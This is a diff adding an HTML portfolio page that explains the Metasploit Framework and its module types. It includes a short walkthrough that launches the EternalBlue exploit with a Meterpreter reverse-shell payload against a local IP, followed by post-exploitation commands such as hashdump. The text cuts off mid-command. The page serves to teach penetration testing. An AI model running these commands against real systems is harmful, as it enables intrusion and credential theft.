@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Metasploit / Security Tools</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+
+<body>
+    <nav>
+        <div class="logo"></div>
+        <ul>
+            <li><a href="../index.html">← Back to Portfolio</a></li>
+        </ul>
+    </nav>
+
+    <section style="padding-top: 120px;">
+        <h2 class="section-title">Metasploit Framework</h2>
+        <div class="case-file">
+            <h3 class="case-title">Penetration Testing & Exploit Development Framework</h3>
+            <p>
+                Metasploit Framework is an open-source platform for developing, testing, and executing exploits.
+                Created in 2003 by H.D. Moore and now maintained by Rapid7, it’s the most widely used tool for
+                penetration testing and vulnerability validation. Security teams use it to safely verify if
+                systems are actually exploitable, not just theoretically vulnerable.
+            </p>
+
+            <h4 style="color: var(--terminal-green); margin: 24px 0 12px;">Core Components</h4>
+            <p>
+                - <strong>Exploits:</strong> Code that takes advantage of a vulnerability: EternalBlue, Shellshock,
+                etc.<br>
+                - <strong>Payloads:</strong> Code executed after exploit succeeds: reverse shells, Meterpreter, add
+                user<br>
+                - <strong>Auxiliary:</strong> Scanners, fuzzers, DoS modules that don’t give you a shell<br>
+                - <strong>Encoders:</strong> Obfuscate payloads to bypass AV/IDS signatures<br>
+                - <strong>Post:</strong> Modules for privilege escalation, credential dumping, lateral movement after
+                access<br>
+                - <strong>NOPs:</strong> No-operation sleds for buffer overflow exploit stability
+            </p>
+
+            <h4 style="color: var(--terminal-green); margin: 24px 0 12px;">Basic Workflow Example</h4>
+
+            <p><strong>1. Scan and select exploit:</strong></p>
+            <div class="code-snippet">
+                <code>
+msf6 > search ms17-010<br>
+msf6 > use exploit/windows/smb/ms17_010_eternalblue<br>
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.10<br>
+msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp<br>
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.5<br>
+msf6 exploit(ms17_010_eternalblue) > exploit
+        </code>
+            </div>
+            <p style="color: var(--text-dim); font-size: 0.9rem; margin-bottom: 20px;">
+                This targets the EternalBlue SMB vulnerability. If successful, you get a Meterpreter session on the
+                target.
+            </p>
+
+            <p><strong>2. Post-exploitation with Meterpreter:</strong></p>
+            <div class="code-snippet">
+                <code>
+meterpreter > sysinfo<br>
+meterpreter > getuid<br>
+meterpreter > hashdump<br>
+meterpreter > screenshot<br>
+meterpreter
